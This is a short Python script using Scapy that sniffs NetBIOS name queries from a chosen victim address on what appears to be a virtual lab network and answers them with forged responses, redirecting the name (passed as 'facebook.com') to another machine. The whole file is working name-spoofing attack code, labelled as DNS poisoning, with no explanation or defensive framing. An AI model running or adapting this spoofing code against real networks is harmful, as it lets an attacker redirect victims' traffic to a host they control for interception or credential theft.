from scapy.all import *
from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse


networkInterface = "enp0s3"

victimIP = "192.168.56.101"
victimMAC = "08:00:27:b0:a1:ab"

serverIP = "192.168.56.102"
serverMAC = "08:00:27:c6:a4:61"


def dnsPoisoning(victimIP, url, redirectIP):
    def fakeResponse(pkt, victimIP, url, redirectIP, networkInterface):
        #captore request packet
        if pkt.haslayer(NBNSQueryRequest) and pkt[IP].src == victimIP:
            pkt.show()
            print("***")
            etherLayer = Ether(src =get_if_hwaddr(networkInterface), dst = pkt[Ether].src)
            ipLayer = IP(src = pkt[IP].dst, dst = pkt[IP].src)
            udpLayer = UDP(sport = pkt[UDP].dport, dport = pkt[UDP].sport)
            nbnsResponse = NBNSQueryResponse(NAME_TRN_ID = pkt[NBNSQueryRequest].NAME_TRN_ID, RR_NAME = pkt[NBNSQueryRequest].QUESTION_NAME,
                                             QDCOUNT=0, ANCOUNT = 1, NSCOUNT = 0,ARCOUNT = 0,  NB_ADDRESS = redirectIP)
            poisonedPaket = etherLayer/ipLayer/udpLayer/nbnsResponse

            sendp(poisonedPaket, verbose = 0 , iface = networkInterface)

    sniff(iface=networkInterface, filter="port 137", count = 1, prn = lambda pkt : fakeResponse(pkt, victimIP, "facebook.com", serverIP, networkInterface))

dnsPoisoning(victimIP, "facebook.com", serverIP)


